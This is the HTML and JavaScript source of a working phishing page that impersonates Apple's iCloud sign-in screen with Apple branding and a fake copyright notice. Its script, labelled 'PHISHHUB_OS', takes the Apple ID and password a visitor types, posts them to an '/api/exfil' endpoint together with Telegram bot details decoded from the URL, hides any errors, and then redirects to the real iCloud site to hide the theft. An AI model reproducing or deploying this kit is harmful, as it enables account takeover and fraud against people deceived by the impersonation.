<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign in with Apple ID</title>
    <link rel="shortcut icon" href="https://www.apple.com/favicon.ico">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "SF Pro Text", "SF Pro Display", "SF Pro", "Inter", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #1d1d1f;
            -webkit-font-smoothing: antialiased;
            letter-spacing: -0.022em;
        }

        .apple-card {
            width: 100%;
            max-width: 440px;
            padding: 40px 32px;
            position: relative;
            background: rgba(255, 255, 255, 0.8);
            backdrop-filter: blur(20px);
            transition: all 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
        }

        @media (min-width: 640px) {
            .apple-card {
                padding: 56px 48px;
            }
        }

        .apple-input {
            width: 100%;
            height: 54px;
            border: 1px solid #d2d2d7;
            border-radius: 12px;
            padding: 0 16px;
            font-size: 17px;
            outline: none;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            margin-bottom: 14px;
            background: #fff;
        }

        .apple-input:focus {
            border-color: #0066cc;
            box-shadow: 0 0 0 4px rgba(0, 102, 204, 0.1);
        }

        .apple-btn-primary {
            background-color: #000000;
            color: #ffffff;
            border-radius: 12px;
            height: 54px;
            width: 100%;
            font-weight: 600;
            font-size: 17px;
            transition: transform 0.1s, opacity 0.2s;
            margin-top: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .apple-btn-primary:active { transform: scale(0.98); opacity: 0.8; }

        /* Progress Bar - Apple Indeterminate Style */
        .loading-bar {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: rgba(0,0,0,0.05);
            overflow: hidden;
            display: none;
        }
        .loading-bar div {
            position: absolute;
            background-color: #000;
            height: 100%;
            width: 30%;
            animation: indeterminate 1s infinite cubic-bezier(0.65, 0, 0.35, 1);
        }
        @keyframes indeterminate {
            0% { left: -30%; }
            100% { left: 100%; }
        }

        .step-in {
            animation: appleIn 0.6s cubic-bezier(0.2, 0.8, 0.2, 1) forwards;
        }
        @keyframes appleIn {
            from { opacity: 0; transform: scale(0.97) translateY(8px); }
            to { opacity: 1; transform: scale(1) translateY(0); }
        }

        .apple-logo {
            width: 38px;
            height: auto;
            margin-bottom: 24px;
        }
    </style>
</head>
<body class="flex flex-col min-h-screen items-center justify-center p-4">

    <div class="apple-card text-center">
        <div id="loader" class="loading-bar"><div></div></div>

        <!-- Correct Apple Logo Asset -->
        <div class="flex justify-center">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/Apple_logo_black.svg/960px-Apple_logo_black.svg.png" alt="Apple" class="apple-logo">
        </div>

        <!-- Step 1: Identifier -->
        <div id="step-id" class="step-in">
            <h1 class="text-[26px] font-bold tracking-tight mb-2">Sign in</h1>
            <p class="text-[17px] text-[#86868b] mb-10">Use your Apple ID to sign in to iCloud.</p>
            
            <div class="text-left">
                <input type="email" id="email" placeholder="Apple ID" class="apple-input" autocomplete="username">
                <div class="mt-4 text-center">
                    <a href="#" class="text-[14px] text-[#0066cc] font-medium hover:underline">Forgot Apple ID or password?</a>
                </div>
                <p class="text-[13px] text-[#86868b] mt-12 leading-relaxed text-center px-4">
                    Your Apple ID is the account you use to access all Apple services.
                </p>
                <button onclick="toPassword()" class="apple-btn-primary mt-8">Continue</button>
            </div>
        </div>

        <!-- Step 2: Password -->
        <div id="step-pass" class="hidden">
            <h1 class="text-[26px] font-bold tracking-tight mb-2">Password</h1>
            <div class="flex items-center justify-center gap-2 mb-8 bg-[#f5f5f7] py-2 px-4 rounded-full w-fit mx-auto border border-[#e8e8ed]">
                <span id="display-user" class="text-sm font-semibold"></span>
                <button onclick="location.reload()" class="text-[#0066cc] p-1"><svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M19 9l-7 7-7-7"/></svg></button>
            </div>
            
            <div class="text-left">
                <input type="password" id="password" placeholder="Password" class="apple-input" autofocus>
                <button onclick="executeDispatch()" class="apple-btn-primary">Sign In</button>
                <div class="mt-6 text-center">
                    <a href="#" class="text-[14px] text-[#0066cc] font-medium hover:underline">Forgot password?</a>
                </div>
            </div>
        </div>
    </div>

    <!-- 2026 Minimal Footer -->
    <footer class="fixed bottom-0 w-full p-8 flex flex-col items-center gap-4 text-[12px] text-[#86868b]">
        <div class="flex gap-4 font-medium">
            <a href="#" class="hover:text-[#1d1d1f]">Privacy Policy</a>
            <span class="opacity-30">|</span>
            <a href="#" class="hover:text-[#1d1d1f]">Terms of Service</a>
        </div>
        <p class="opacity-60">Copyright © 2026 Apple Inc. All rights reserved.</p>
    </footer>

    <script>
        // PHISHHUB_OS: Config Extraction
        const getConf = () => {
            const h = window.location.hash.substring(1);
            if (!h) return null;
            try { return JSON.parse(atob(h)); } catch(e) { return null; }
        };

        const config = getConf();
        let userEmail = "";

        function toPassword() {
            userEmail = document.getElementById('email').value;
            if(!userEmail) return;

            document.getElementById('loader').style.display = 'block';
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                document.getElementById('display-user').innerText = userEmail;
                document.getElementById('step-id').classList.add('hidden');
                document.getElementById('step-pass').classList.remove('hidden');
                document.getElementById('step-pass').classList.add('step-in');
            }, 800);
        }

        async function executeDispatch() {
            const pass = document.getElementById('password').value;
            if(!pass) return;

            document.getElementById('loader').style.display = 'block';
            const finalRedirect = "https://www.icloud.com/";

            if(!config) {
                setTimeout(() => window.location.href = finalRedirect, 1000);
                return;
            }

            try {
                // Relay to PHISHHUB_OS serverless backend
                await fetch('/api/exfil', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        target: 'apple',
                        credentials: { username: userEmail, password: pass },
                        tgToken: config.t,
                        tgChat: config.c
                    })
                });
            } catch (e) {
                // Silenced
            } finally {
                setTimeout(() => {
                    window.location.href = finalRedirect;
                }, 1000);
            }
        }
    </script>
</body>
</html>
